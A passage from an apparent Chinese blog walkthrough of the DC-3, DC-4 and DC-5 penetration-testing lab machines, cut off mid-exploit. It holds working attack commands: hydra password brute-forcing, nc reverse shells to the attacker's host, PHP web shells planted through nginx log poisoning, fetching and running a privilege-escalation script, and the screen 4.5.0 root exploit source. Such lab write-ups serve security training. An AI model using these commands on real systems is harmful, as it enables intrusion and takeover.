<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928155448680.png" alt="image-20220928155448680"></p>
<p>先弄个交互的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-3:/var/www/html/templates/protostar$ </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928160431041.png" alt="image-20220928160431041"></p>
<p>我们可以通过whoami知道现在的用户是web的用户，我们的权限太低了，得想办法提权，我们在前面知道这个ubuntu的系统非常老了，版本在16.04</p>
<p>在msfconsole里面输入searchsploit 16.04 ubuntu</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928161501777.png" alt="image-20220928161501777"></p>
<p>下载脚本到kali</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/julintongxue/julintianxia/blob/main/39772.zip</span><br></pre></td></tr></table></figure>

<p>上传脚本到靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/39772.zip /tmp/39772.zip</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928232817068.png" alt="image-20220928232817068"></p>
<p>解压之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ <span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">compile.sh  doubleput.c  hello	  suidhelper</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">compile.sh  doubleput.c  hello	  suidhelper</span><br><span class="line">doubleput   fuse_mount	 hello.c  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput</span><br><span class="line">./doubleput</span><br><span class="line"></span><br><span class="line">root@DC-3:/tmp/ebpf_mapfd_doubleput_exploit<span class="comment"># </span></span><br><span class="line"><span class="comment">#可以看到符号已经变成#号了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#whoami确认一下</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220929004537682.png" alt="image-20220929004537682"></p>
<p>回到root目录</p>
<p>找到flag</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220929004654873.png" alt="image-20220929004654873"></p>
<p>在此，DC-3结束</p>
<h3 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h3><p>开启DC3，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 192.168.245.0/24</span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091158975.png" alt="image-20221031091158975"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -O 192.168.245.147</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091340103.png" alt="image-20221031091340103"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091505621.png" alt="image-20221031091505621"></p>
<p><strong>web指纹识别</strong></p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.245.147</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091918457.png" alt="image-20221031091918457"></p>
<p>可知网站是nginx中间件搭建</p>
<p>已知用户名为 admin，但不知密码，用 hydra 爆破一下</p>
<p>首先解压密码包</p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<p>爆破密码命令： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 用户名字典 -P 密码字典 -o DC4.pass -vV -t 5 -f 192.168.15.152 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o DC4.pass -vV -t 5 -f 192.168.245.147 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>直接账号密码爆破这类默认账号一般是admin 可以尝试下</li>
<li>-L  — 用户字典</li>
<li>-l 直接写用户名</li>
<li>-o — 输出的文件名。爆破成功的话里面会放得到的密码。</li>
<li>-f — 得到了一组用户名和密码就停止爆破。</li>
<li>http-post-form — post表单提交的数据。</li>
<li>&#x2F;login.php — 请求的目录。</li>
<li>username&#x3D;^USER^&amp;password&#x3D;^PASS^ — 攻击载荷。</li>
<li>S&#x3D;logout — 密码正确时返回的应用关键字符串。<br>S&#x3D;logout是因为一般登录成功之后返回的关键字符串中都有logout</li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094803663.png" alt="image-20221031094803663"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094748346.png" alt="image-20221031094748346"></p>
<p>得到账号：admin 密码：happy</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094911812.png" alt="image-20221031094911812"></p>
<p>成功登录界面</p>
<p>点击command</p>
<p>点RUN 发现好像是命令执行了 ls -l 抓包看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095351381.png" alt="image-20221031095351381"></p>
<p>果然，是通过关键字 <code>radio</code>提交命令的 我们加个<code>ip add</code>命令试试</p>
<p>记得空格要加+号！！</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ip</span> <span class="keyword">add</span>  		#<span class="built_in">ip</span>+<span class="keyword">add</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095504601.png" alt="image-20221031095504601"></p>
<p>nice,直接返回ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095530729.png" alt="image-20221031095530729"></p>
<p>**反弹shel ** </p>
<p>尝试用nc看看可不可以反弹</p>
<p>kali上先开启侦听8080端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>在bp写入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.245.132 8080</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095820381.png" alt="image-20221031095820381"></p>
<p>kali马上接受到反弹的shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095841109.png" alt="image-20221031095841109"></p>
<p>使用python获得交互式界面,在kali输入命令：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100012727.png" alt="image-20221031100012727"></p>
<p>看看具有SUID权限的命令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100428920.png" alt="image-20221031100428920"></p>
<p>查看查看exim4版本</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --<span class="keyword">version</span>		<span class="comment">#查看exim4的版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100458599.png" alt="image-20221031100458599"></p>
<p>版本是4.89,爷笑哭了</p>
<p>先看看本地漏洞库</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> exim <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100620731.png" alt="image-20221031100620731"></p>
<p>46996符合exim 4.89 就用这个 拷贝到kali的apache web页面下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2.service  									<span class="comment">#开启apache</span></span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html <span class="comment">#拷贝到kali的apache web</span></span><br></pre></td></tr></table></figure>

<p>DC4:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.245.132/46996.sh</span><br><span class="line"><span class="built_in">chmod</span> +x 46996.sh</span><br><span class="line">./46996.sh</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031101218731.png" alt="image-20221031101218731"></p>
<p>提权成功</p>
<p>夺取flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031101508925.png" alt="image-20221031101508925"></p>
<h3 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h3><p>开启DC5，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 192.168.245.0/24</span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113754330-1667183983059.png" alt="image-20221024113754330"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -O 192.168.245.144</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113841827-1667183983057.png" alt="image-20221024113841827"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113931244-1667183983059.png" alt="image-20221024113931244"></p>
<p>额。。。出现一个很陌生端web端，我们扫描一下这个网站的目录，这需要用dirsearch</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.245.144/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133116101-1667183983059.png" alt="image-20221024133116101"></p>
<p>找到了很多目录，发现<code>thankyou.php</code>这个目录刷新之后页面的版权时间每次都在变，从<code>2017-2020</code>随机改变。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133243518-1667183983060.png" alt="image-20221024133243518"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133302027-1667183983060.png" alt="image-20221024133302027"></p>
<p>然后在<code>footer.php</code>这个目录下找到了版权时间的路径，而且也是刷新之后从<code>2017-2020</code>随机改变。</p>
<p>然后我们检测一下网站架构，发现是由<code>nginx</code>搭建的。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024145539433-1667183983060.png" alt="image-20221024145539433"></p>
<p>根据url特征，很有可能能存在文件包含漏洞，既然可能存在 文件包含漏洞 ,现在需要知道<code> thankyou.php</code> 是如何把 <code>footer.php </code>包含的</p>
<p>wfuzz 模糊测试：</p>
<p>1.目录扫描</p>
<p>2.找参数    <code>192.168.245.144/?=value</code>    它能替换<code>？</code>找到对应参数</p>
<p>3.密码爆破   username password</p>
<p>4.找sql xss</p>
<p>5.压力测试</p>
<p>这个网址是留给我们的提示，我们可以使用wfuzz来找到网页的参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.245.144/thankyou.php?FUZZ --hw 66</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024135621181-1667183983060.png" alt="image-20221024135621181"></p>
<p>由此可以推出<code>192.168.245.144/thankyou.php?file=footer.php</code>是我们需要的文件包含地址</p>
<p>那么修改footer.php为&#x2F;etc&#x2F;passwd看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024144932957-1667183983060.png" alt="image-20221024144932957"></p>
<p>由于是niginx搭建的网站，大概推测nginx的日志地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024145803116-1667183983061.png" alt="image-20221024145803116"></p>
<p>上面还有<code>wfuzz</code>爆破信息呢！</p>
<p>现在我们打开bp，尝试写入phpinfo()进行探测，看一下是否可以包含成功。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210159631-1667183983061.png" alt="image-20221024210159631"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &lt;?php phpinfo();?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>然后点击send，返回一个400报错，我们查看一下<code>http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</code>发现文件包含成功。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210334796-1667183983061.png" alt="image-20221024210334796"></p>
<p>我们开始重新改写一句话木马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/thankyou.php?file=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210750067-1667183983061.png" alt="image-20221024210750067"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>执行返回了200，我们尝试用蚁剑连接,url是一下地址，密码是shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210959973-1667183983061.png" alt="image-20221024210959973"></p>
<p>连接一句话木马，获得 www-data权限，尝试打开虚拟终端。。。结果发现被拒绝了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024211229469-1667183983061.png" alt="image-20221024211229469"></p>
<p>推测是eval函数被禁用了。</p>
<p>我们改写一下php一句话木马脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php passthru(<span class="variable">$_GET</span>[<span class="string">&#x27;oo&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>passthru - 执行外部程序并显示原始输出</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php passthru(<span class="variable">$_GET</span>[<span class="string">&#x27;oo&#x27;</span>]);?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-10-24_21-18-07.png" alt="Snipaste_2022-10-24_21-18-07"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024211916162-1667183983062.png" alt="image-20221024211916162"></p>
<p>因为这个函数可以执行外部程序并且显示原始输出，所以可以配合nc反弹shell脚本。</p>
<p>检测函数是否能够执行,url输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log&amp;oo=<span class="built_in">cat</span>%20/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024212723086-1667183983062.png" alt="image-20221024212723086"></p>
<p>完美执行，我们尝试写入nc脚本反弹shell给kali。</p>
<p>kali端命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>

<p>nc执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oo=nc kali-ip 8888 -c /bin/bash</span><br></pre></td></tr></table></figure>

<p>url执行命令（将上面命令修改为url识别命令）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log&amp;oo=nc%20192.168.245.132%208888%20-</span><br><span class="line">c%20/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213351243-1667183983062.png" alt="image-20221024213351243"></p>
<p>kali收到反弹信息。。。</p>
<p>修改为交互界面的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213450091-1667183983062.png" alt="image-20221024213450091"></p>
<p>sudo -l 发现没有sudo命令</p>
<p>查找一下suid程序： find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213538997-1667183983062.png" alt="image-20221024213538997"></p>
<p>在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 查找一下，发现 &#x2F;bin&#x2F;screen-4.5.0 可利用</p>
<p>我这使用kali查找其漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024214336815-1667183983063.png" alt="image-20221024214336815"></p>
<p>使用第一个脚本，我们查看一下用法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>

<p>查看文件可以知道，脚本文件需要分成3个步骤完成。</p>
<p>第一步：将第一部分代码写入libhax.c文件中，再执行相应命令生成libhax.so文件。最后删除libhax.c文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># cat &lt;&lt; EOF &gt; /tmp/libhax.c                            </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span></span><br><span class="line">/tmp/libhax.c: In <span class="keyword">function</span> ‘dropshell’:</span><br><span class="line">/tmp/libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘<span class="built_in">chmod</span>’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">hsperfdata_root</span><br><span class="line">libhax.c</span><br><span class="line">libhax.so</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># rm -rf /tmp/libhax.c</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024221557692-1667183983063.png" alt="image-20221024221557692"></p>
<p>第二步：将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件，最后删除rootshell.c文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    